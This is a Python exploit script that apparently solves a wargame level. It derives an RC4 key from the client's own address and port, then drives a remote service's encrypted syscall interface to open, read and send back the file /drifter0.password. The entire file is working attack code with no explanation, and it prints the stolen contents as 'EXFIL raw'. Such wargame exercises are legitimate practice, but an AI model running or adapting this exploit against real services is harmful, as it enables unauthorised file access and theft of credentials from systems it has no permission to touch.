import socket, struct, sys, time
HOST = "127.0.0.1"
PORT = 1111
def rc4(state, x, y, data):
    buf = bytearray(data)
    for i in range(len(buf)):
        x = (x + 1) % 256
        y = (state[x] + y) % 256
        state[x], state[y] = state[y], state[x]
        buf[i] ^= state[(state[x] + state[y]) % 256]
    return state, x, y, bytes(buf)
def prepare_key(keymat):
    s = list(range(256)); j = 0
    for i in range(256):
        j = (keymat[i % len(keymat)] + s[i] + j) % 256
        s[i], s[j] = s[j], s[i]
    return s, 0, 0
def call(sock, K, nr, *a):
    a = a + (0,) * (8 - len(a))
    sti, xi, yi, sto, xo, yo = K
    sti, xi, yi, enc = rc4(sti, xi, yi, struct.pack("<9I", nr, *a))
    sock.sendall(enc)
    r = b""
    while len(r) < 4:
        c = sock.recv(4 - len(r))
        if not c: raise EOFError
        r += c
    sto, xo, yo, dec = rc4(sto, xo, yo, r)
    return (sti, xi, yi, sto, xo, yo), struct.unpack("<i", dec)[0]
s = socket.create_connection((HOST, PORT), timeout=10)
me = s.getsockname()          # what the SERVER sees as the peer
keymat = socket.inet_aton(me[0]) + struct.pack(">H", me[1])
print("keymat:", keymat.hex())
sti, xi, yi = prepare_key(keymat)
sto, xo, yo = prepare_key(keymat)
for _ in range(42):          # skip 42*6 keystream bytes both ways
    sti, xi, yi, _ = rc4(sti, xi, yi, b"\0" * 6)
    sto, xo, yo, _ = rc4(sto, xo, yo, b"\0" * 6)
K = (sti, xi, yi, sto, xo, yo)
K, uid = call(s, K, 24); print("getuid ->", uid)
K, page = call(s, K, 192, 0x10000000, 0x1000, 3, 0x22, 0xffffffff, 0)
print("mmap2 ->", hex(page & 0xffffffff)); page &= 0xffffffff
pathfd = None
for fd in (3, 4, 5, 6):
    K, r = call(s, K, 108, fd, page + 0x400, 0)
    if r == 0:
        pathfd = fd; break
print("socket fd:", pathfd)
sti, xi, yi, sto, xo, yo = K
sti, xi, yi, enc = rc4(sti, xi, yi,
    struct.pack("<9I", 3, pathfd, page, 19, 0, 0, 0, 0, 0))
s.sendall(enc); s.sendall(b"/drifter0.password\0")
r = b""
while len(r) < 4:
    r += s.recv(4 - len(r))
sto, xo, yo, dec = rc4(sto, xo, yo, r)
K = (sti, xi, yi, sto, xo, yo)
print("read path ->", struct.unpack("<i", dec)[0])
K, fdr = call(s, K, 5, page, 0, 0)
print("open ->", fdr)
K, n = call(s, K, 3, fdr, page + 0x200, 64)
print("read file ->", n)
sti, xi, yi, sto, xo, yo = K
sti, xi, yi, enc = rc4(sti, xi, yi,
    struct.pack("<9I", 4, pathfd, page + 0x200, n, 0, 0, 0, 0, 0))
s.sendall(enc)
data = b""
s.settimeout(5)
while len(data) < n + 4:
    c = s.recv(64)
    if not c: break
    data += c
print("EXFIL raw:", data[:n])
sto, xo, yo, dec = rc4(sto, xo, yo, data[n:n+4])
print("write ->", struct.unpack("<i", dec)[0])
s.close()

